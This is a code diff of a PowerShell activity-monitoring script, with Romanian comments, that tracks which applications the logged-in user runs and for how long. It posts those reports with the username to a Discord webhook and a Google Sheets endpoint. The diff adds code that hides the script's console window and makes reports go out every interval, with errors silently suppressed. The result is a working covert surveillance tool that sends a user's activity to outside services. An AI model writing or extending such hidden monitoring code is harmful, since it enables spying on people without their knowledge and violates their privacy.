@@ -1,6 +1,17 @@
 # Fortam utilizarea protocolului TLS 1.2 pentru a putea comunica cu serverele Discord
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
+# Hide the console window
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0)  # 0 = SW_HIDE
+
 # Definim functiile C# necesare pentru a citi fereastra activa din Windows
 $code = @"
 using System;
@@ -71,7 +82,6 @@ while ($true) {
             $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
             if ($process) {
                 $name = $process.ProcessName
-                
                 # Get window title
                 $windowTitle = ""
                 $sb = New-Object System.Text.StringBuilder(256)
@@ -140,38 +150,41 @@ while ($true) {
         }
         
         # Send report
-        if ($appStats.Count -gt 0) {
-            $message = "**Raport Activitate**`n"
-            $message += "**Utilizator:** $currentUser`n"
-            $message += "**Ora:** " + (Get-Date).ToString("HH:mm") + "`n"
-            $message += "`n"
-            
-            # Sortam aplicatiile dupa timpul petrecut (descrescator)
-            $sortedStats = $appStats.GetEnumerator() | Sort-Object Value -Descending
-            
-            # Prepare data for Google Sheets
-            $data = @()
-            
-            foreach ($stat in $sortedStats) {
-                $seconds = $stat.Value
-                if ($seconds -ge 6) {
-                    $message += "- **$($stat.Name)**: $seconds secunde`n"
-                    $data += @{appName = $stat.Name; seconds = $seconds; user = $currentUser}
-                }
+        $message = "**Raport Activitate**`n"
+        $message += "**Utilizator:** $currentUser`n"
+        $message += "**Ora:** " + (Get-Date).ToString("HH:mm") + "`n"
+        $message += "`n"
+        
+        # Sortam aplicatiile dupa timpul petrecut (descrescator)
+        $sortedStats = $appStats.GetEnumerator() | Sort-Object Value -Descending
+        
+        # Prepare data for Google Sheets
+        $data = @()
+        $activityFound = $false
+        
+        foreach ($stat in $sortedStats) {
+            $seconds = $stat.Value
+            if ($seconds -ge 6) {
+                $activityFound = $true
+                $message += "- **$($stat.Name)**: $seconds secunde`n"
+                $data += @($stat.Name, $seconds, $currentUser)
             }
-
-            # Send data to Google Sheets
-            if ($data.Count -gt 0) {
-                $jsonData = @($data) | ConvertTo-Json
-                Invoke-RestMethod -Uri $googleWebhookUrl -Method Post -Body $jsonData -ContentType 'application/json' -ErrorAction SilentlyContinue
-                Write-Host "Data sent to Google Sheets: $($data.Count) entries"
-            }
-
-            # Send to Discord
-            $escapedMessage = $message -replace '\\', '\\\\' -replace '"', '\"' -replace "`n", '\n' -replace "`r", '\r' -replace "`t", '\t'
-            $payload = '{"content": "' + $escapedMessage + '"}'
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue
         }
+
+        if (-not $activityFound) {
+            $message += "- nici o activitate detectată în ultimele $reportIntervalSeconds secunde`n"
+        }
+
+        # Send data to Google Sheets when activity exists
+        if ($data.Count -gt 0) {
+            $jsonData = $data | ConvertTo-Json
+            Invoke-RestMethod -Uri $googleWebhookUrl -Method Post -Body $jsonData -ContentType 'application/json' -ErrorAction SilentlyContinue
+            Write-Host "Data sent to Google Sheets: $($data.Count) entries"
+        }
+
+        # Send to Discord always
+        $payload = @{ content = $message } | ConvertTo-Json -Compress
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue
 
         # Reset for next period
         $appStats.Clear()
